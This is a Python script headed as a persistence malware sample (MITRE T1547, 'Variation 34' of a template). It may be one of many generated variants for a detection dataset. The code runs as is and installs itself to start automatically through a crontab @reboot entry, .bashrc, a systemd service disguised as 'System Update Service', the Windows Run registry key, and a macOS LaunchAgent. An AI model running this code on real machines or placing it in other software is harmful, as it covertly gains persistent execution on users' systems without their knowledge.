# Obfuscated - Level 1
# Variation: 34
# Persistence Sample - Template v2.0
# Language: Python
# Attack Type: Persistence
# MITRE ATT&CK: T1547 (Boot or Logon Autostart Execution)

import os
import sys
import subprocess
from pathlib import Path

def add_to_crontab(job_name, command, schedule="@reboot"):
    """添加到 crontab"""
    try:
        # 获取当前 crontab
        result = subprocess.run(
            ['crontab', '-l'],
            capture_output=True,
            text=True
        )
        current_crontab = result.stdout if result.returncode == 0 else ""
        
        # 添加新任务
        new_job = f"{schedule} {command} # {job_name}"
        if new_job not in current_crontab:
            new_crontab = current_crontab + "\n" + new_job + "\n"
            
            # 写入临时文件
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(new_crontab)
                temp_file = f.name
            
            # 安装 crontab
            subprocess.run(['crontab', temp_file])
            
            # 清理
            os.unlink(temp_file)
            
            return True
        return False
    except Exception as e:
        print(f"Failed to add to crontab: {e}")
        return False

def add_to_bashrc(command, comment="# Persistence"):
    """添加到 .bashrc"""
    try:
        bashrc = Path.home() / '.bashrc'
        
        if bashrc.exists():
            content = bashrc.read_text()
            
            # 检查是否已存在
            if command not in content:
                # 追加
                with open(bashrc, 'a') as f:
                    f.write(f"\n{comment}\n{command}\n")
                return True
        return False
    except Exception as e:
        print(f"Failed to add to bashrc: {e}")
        return False

def create_systemd_service(service_name, executable, description="System Service"):
    """创建 systemd 服务"""
    try:
        user = os.environ.get('USER', 'user')
        
        service_content = f"""[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={executable}
Restart=always
RestartSec=10
User={user}
WorkingDirectory={Path.home()}

[Install]
WantedBy=multi-user.target
"""
        
        # systemd 目录
        if os.geteuid() == 0:
            # Root: 系统级
            service_dir = Path('/etc/systemd/system')
        else:
            # User: 用户级
            service_dir = Path.home() / '.config' / 'systemd' / 'user'
            service_dir.mkdir(parents=True, exist_ok=True)
        
        service_file = service_dir / f"{service_name}.service"
        service_file.write_text(service_content)
        
        # 启用服务
        if os.geteuid() == 0:
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])
        else:
            subprocess.run(['systemctl', '--user', 'daemon-reload'])
            subprocess.run(['systemctl', '--user', 'enable', service_name])
            subprocess.run(['systemctl', '--user', 'start', service_name])
        
        return True
    except Exception as e:
        print(f"Failed to create systemd service: {e}")
        return False

def add_to_startup_windows(program_name, program_path):
    """添加到 Windows 启动项"""
    try:
        import winreg
        
        # 当前用户启动文件夹
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(
            key,
            program_name,
            0,
            winreg.REG_SZ,
            program_path
        )
        
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Failed to add to Windows startup: {e}")
        return False

def create_launch_agent(mac_name, program_path, arguments=None):
    """创建 macOS Launch Agent"""
    try:
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{mac_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{program_path}</string>
"""
        
        if arguments:
            for arg in arguments:
                plist_content += f"        <string>{arg}</string>\n"
        
        plist_content += """    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/{mac_name}.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/{mac_name}.err</string>
</dict>
</plist>
"""
        
        # LaunchAgents 目录
        launch_agents_dir = Path.home() / 'Library' / 'LaunchAgents'
        launch_agents_dir.mkdir(parents=True, exist_ok=True)
        
        plist_file = launch_agents_dir / f"{mac_name}.plist"
        plist_file.write_text(plist_content)
        
        # 加载
        subprocess.run(['launchctl', 'load', str(plist_file)])
        
        return True
    except Exception as e:
        print(f"Failed to create Launch Agent: {e}")
        return False

def main():
    """主函数"""
    print("=" * 60)
    print("Persistence Sample v2.0")
    print("=" * 60)
    print()
    
    # 配置
    SERVICE_NAME = "system-update-service"
    PROGRAM_NAME = "update-checker"
    CURRENT_SCRIPT = os.path.abspath(__file__)
    
    persistence_methods = {
        'crontab': False,
        'bashrc': False,
        'systemd': False,
        'windows_startup': False,
        'launch_agent': False,
    }
    
    # Linux: Crontab
    print("[*] Attempting crontab persistence...")
    if sys.platform.startswith('linux'):
        result = add_to_crontab(
            PROGRAM_NAME,
            f"python3 {CURRENT_SCRIPT}",
            "@reboot"
        )
        persistence_methods['crontab'] = result
        print(f"    {'✓' if result else '✗'} Crontab: {'Success' if result else 'Failed'}")
    else:
        print("    ⊘ Skipped (not Linux)")
    print()
    
    # Linux: .bashrc
    print("[*] Attempting .bashrc persistence...")
    if sys.platform.startswith('linux'):
        result = add_to_bashrc(
            f"python3 {CURRENT_SCRIPT} &"
        )
        persistence_methods['bashrc'] = result
        print(f"    {'✓' if result else '✗'} Bashrc: {'Success' if result else 'Failed'}")
    else:
        print("    ⊘ Skipped (not Linux)")
    print()
    
    # Linux: systemd
    print("[*] Attempting systemd persistence...")
    if sys.platform.startswith('linux'):
        result = create_systemd_service(
            SERVICE_NAME,
            f"python3 {CURRENT_SCRIPT}",
            "System Update Service"
        )
        persistence_methods['systemd'] = result
        print(f"    {'✓' if result else '✗'} Systemd: {'Success' if result else 'Failed'}")
    else:
        print("    ⊘ Skipped (not Linux)")
    print()
    
    # Windows: Startup
    print("[*] Attempting Windows startup persistence...")
    if sys.platform == 'win32':
        result = add_to_startup_windows(
            PROGRAM_NAME,
            f'python "{CURRENT_SCRIPT}"'
        )
        persistence_methods['windows_startup'] = result
        print(f"    {'✓' if result else '✗'} Windows Startup: {'Success' if result else 'Failed'}")
    else:
        print("    ⊘ Skipped (not Windows)")
    print()
    
    # macOS: Launch Agent
    print("[*] Attempting macOS Launch Agent persistence...")
    if sys.platform == 'darwin':
        result = create_launch_agent(
            f"com.{PROGRAM_NAME}.startup",
            f"python3 {CURRENT_SCRIPT}"
        )
        persistence_methods['launch_agent'] = result
        print(f"    {'✓' if result else '✗'} Launch Agent: {'Success' if result else 'Failed'}")
    else:
        print("    ⊘ Skipped (not macOS)")
    print()
    
    # 汇总
    print("=" * 60)
    print("Persistence Summary")
    print("=" * 60)
    
    success_count = sum(1 for v in persistence_methods.values() if v)
    total_count = len(persistence_methods)
    
    for method, success in persistence_methods.items():
        status = "✓" if success else "✗" if not success else "⊘"
        print(f"  {status} {method}")
    
    print()
    print(f"Total: {success_count}/{total_count} methods successful")
    print()
    print("Persistence complete!")
    print("=" * 60)

if __name__ == '__main__':
    main()
